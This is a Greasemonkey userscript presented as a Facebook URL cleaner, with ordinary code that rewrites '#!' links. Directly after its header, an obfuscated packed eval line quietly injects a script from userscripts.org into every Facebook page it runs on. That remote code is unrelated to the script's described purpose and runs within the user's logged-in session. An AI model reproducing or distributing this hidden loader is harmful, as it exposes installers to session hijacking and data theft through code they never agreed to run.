// ==UserScript==
// @name          Facebook URL Cleaner Plus + Last Update
// @version       8
// @date          2010-10-07
// @description   Cleans Facebook URLs that don't actually take you to a new page.
// @namespace     http://www.theworldofstuff.com/greasemonkey/
// @copyright     Copyright 2008-2010 Jordon Kalilich (http://www.theworldofstuff.com/)
// @license       GNU GPL version 3 or later; http://www.gnu.org/copyleft/gpl.html
// @require       http://usocheckup.dune.net/29910.js?maxage=3
// @include       http*://*.facebook.com/*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


// to enable when browsing photo galleries, change the following value to true:
var enableInGalleries = false;

function checkURL(event) {
   if (reg.test(location.href)) {
      if (!(/photo\.php.*#.*photo\.php/i.test(location.href)) || enableInGalleries) { // thanks, discrete structures
         document.removeEventListener('DOMNodeInserted', checkURL, true); // we need to remove the event listener or we might cause an infinite loop apparently
         location.replace(location.href.replace(reg, '$1$3'));
      }
   }
}

if (top.location == location && /\.facebook\.com$/i.test(location.hostname)) {
   var reg = /^(https?:\/\/([-a-z0-9]+\.)*facebook\.com)\/[^#]*#!(\/.*)/i;
   document.addEventListener('DOMNodeInserted', checkURL, true);
}

